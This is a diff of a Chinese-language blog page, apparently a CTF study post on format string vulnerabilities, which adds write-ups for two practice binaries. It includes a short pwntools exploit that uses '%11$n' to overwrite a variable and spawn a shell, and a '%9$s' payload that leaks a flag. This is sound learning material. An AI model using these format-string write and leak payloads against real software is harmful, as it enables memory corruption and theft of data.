@@ -164,7 +164,7 @@
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2026-01-14 00:37:50
+          2026-01-17 01:57:22
         </span>
         
               <span class="post-tags">
@@ -409,6 +409,30 @@
 <p>（1）<strong>\x00 截断</strong>：<code>printf</code> 遇到空字节停止，构造 Payload 时需将地址放在 Payload 的最后，或者利用栈上已有的指针对其进行修改。</p>
 <p>（2）<strong>缓冲区大小</strong>：如果 buf 太小，可能无法容纳复杂的 Payload。</p>
 <h2 id="格式化字符串漏洞练习">格式化字符串漏洞练习</h2>
+<h3 id="fmtstr1">fmtstr1</h3>
+<p><img src="/2026/01/12/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%92%8C%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%A6%E4%B9%A0/image-20260116235258673.png" alt="image-20260116235258673"></p>
+<p>定位漏洞点。</p>
+<p><img src="/2026/01/12/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%92%8C%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%A6%E4%B9%A0/image-20260116235332376.png" alt="image-20260116235332376"></p>
+<p>去查看x的地址，为：0x0804A02C，想办法将其修改为4即可获取shell。</p>
+<p><img src="/2026/01/12/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%92%8C%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%A6%E4%B9%A0/image-20260117000421157.png" alt="image-20260117000421157"></p>
+<p>利用格式化字符串漏洞。先动态调试程序，这里read函数读取输入的一个A后，查看栈。</p>
+<p><img src="/2026/01/12/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%92%8C%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%A6%E4%B9%A0/image-20260117002859917.png" alt="image-20260117002859917"></p>
+<p>发现A输入的这个内容，被存储在了第11个参数的位置，(0x2c - 0x00) / 4 = 11。x的地址也知道了为：0x0804A02C。那么将0x0804A02C使用read去读取，然后0x0804A02C刚好4个字节，利用格式化字符串漏洞，将0x0804A02C地址处的内容修改为4。</p>
+<p>%n用于写入已打印的字符数，4字节，就是写入4。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;../practices/fmtstr1/fmtstr1&#x27;</span>)</span><br><span class="line">x_address = <span class="number">0x0804A02C</span></span><br><span class="line">payload = p32(x_address) + <span class="string">b&#x27;%11$n&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/01/12/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%92%8C%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%A6%E4%B9%A0/image-20260117003805967.png" alt="image-20260117003805967"></p>
+<h3 id="fmtstr2">fmtstr2</h3>
+<p><img src="/2026/01/12/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%92%8C%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%A6%E4%B9%A0/image-20260117004744498.png" alt="image-20260117004744498"></p>
+<p>定位漏洞点：</p>
+<p><img src="/2026/01/12/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%92%8C%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%A6%E4%B9%A0/image-20260117004811389.png" alt="image-20260117004811389"></p>
+<p>使用gdb去进行动态调试。输入AAAA断点在printf函数处。发现了flag所处的栈的位置。</p>
+<p><img src="/2026/01/12/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%92%8C%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%A6%E4%B9%A0/image-20260117012319401.png" alt="image-20260117012319401"></p>
+<p>这个程序是x64的程序，在x64中前6个参数都是存储在寄存器中的，然后再存储到栈中。调试可以看到flag是位于栈中的第3个参数的位置，那么6+3，实际是第9个参数。</p>
+<p>这题根据IDA，可以看到代码的逻辑，printf处是存在漏洞的。想办法把第9个参数的值，输出出来，就可以得到flag了。</p>
+<p>根据前面学的，使用%s，输出第9个参数的值，这个值是个地址，地址是flag字符串的地址。</p>
+<p>payload很简单为：<code>%9$s</code></p>
+<p><img src="/2026/01/12/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%92%8C%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%A6%E4%B9%A0/image-20260117015635002.png" alt="image-20260117015635002"></p>
 
       </div>
       
@@ -424,7 +448,7 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2026-01-14 00:37:50
+              2026-01-17 01:57:22
             </span>
             
                   <span class="post-tags">
@@ -470,7 +494,7 @@
     <div class="title">Contents</div>
     <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E4%BB%8B%E7%BB%8D"><span class="toc-text">栈迁移介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90"><span class="toc-text">技术原理解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A0%B8%E5%BF%83%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">1.核心应用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%A0%B8%E5%BF%83%E6%8C%87%E4%BB%A4%EF%BC%9Aleave-ret"><span class="toc-text">2.核心指令：leave; ret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BB%A532%E4%B8%BA%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="toc-text">3.攻击原理详解（以32为为例）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Payload%E6%9E%84%E9%80%A0%E7%A4%BA%E4%BE%8B"><span class="toc-text">4. Payload构造示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-64%E4%BD%8D%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">5. 64位系统的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%B8%B8%E8%A7%81%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">6. 常见注意事项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-text">格式化字符串漏洞介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5"><span class="toc-text">1.核心概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E7%89%B9%E5%BE%81"><span class="toc-text">2. 漏洞代码特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8E%9F%E7%90%86%E8%A7%A3%E9%87%8A"><span class="toc-text">3. 原理解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8%E9%80%9F%E6%9F%A5%E8%A1%A8%EF%BC%88Cheat-Sheet%EF%BC%89"><span class="toc-text">4. 利用速查表（Cheat Sheet）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%94%BB%E5%87%BB%E8%83%BD%E5%8A%9B%EF%BC%88Capabilities%EF%BC%89"><span class="toc-text">5. 攻击能力（Capabilities）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B%EF%BC%88Exploit-Workflow%EF%BC%89"><span class="toc-text">6. 利用流程（Exploit Workflow）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E9%98%B2%E5%BE%A1%E4%B8%8E%E7%BB%95%E8%BF%87%EF%BC%88Mitigation%EF%BC%89"><span class="toc-text">7. 防御与绕过（Mitigation）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0"><span class="toc-text">格式化字符串漏洞练习</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E4%BB%8B%E7%BB%8D"><span class="toc-text">栈迁移介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90"><span class="toc-text">技术原理解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A0%B8%E5%BF%83%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">1.核心应用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%A0%B8%E5%BF%83%E6%8C%87%E4%BB%A4%EF%BC%9Aleave-ret"><span class="toc-text">2.核心指令：leave; ret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BB%A532%E4%B8%BA%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="toc-text">3.攻击原理详解（以32为为例）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Payload%E6%9E%84%E9%80%A0%E7%A4%BA%E4%BE%8B"><span class="toc-text">4. Payload构造示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-64%E4%BD%8D%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">5. 64位系统的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%B8%B8%E8%A7%81%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">6. 常见注意事项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-text">格式化字符串漏洞介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5"><span class="toc-text">1.核心概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E7%89%B9%E5%BE%81"><span class="toc-text">2. 漏洞代码特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8E%9F%E7%90%86%E8%A7%A3%E9%87%8A"><span class="toc-text">3. 原理解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8%E9%80%9F%E6%9F%A5%E8%A1%A8%EF%BC%88Cheat-Sheet%EF%BC%89"><span class="toc-text">4. 利用速查表（Cheat Sheet）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%94%BB%E5%87%BB%E8%83%BD%E5%8A%9B%EF%BC%88Capabilities%EF%BC%89"><span class="toc-text">5. 攻击能力（Capabilities）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B%EF%BC%88Exploit-Workflow%EF%BC%89"><span class="toc-text">6. 利用流程（Exploit Workflow）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E9%98%B2%E5%BE%A1%E4%B8%8E%E7%BB%95%E8%BF%87%EF%BC%88Mitigation%EF%BC%89"><span class="toc-text">7. 防御与绕过（Mitigation）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0"><span class="toc-text">格式化字符串漏洞练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fmtstr1"><span class="toc-text">fmtstr1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fmtstr2"><span class="toc-text">fmtstr2</span></a></li></ol></li></ol>
       
     </div>
   </div>
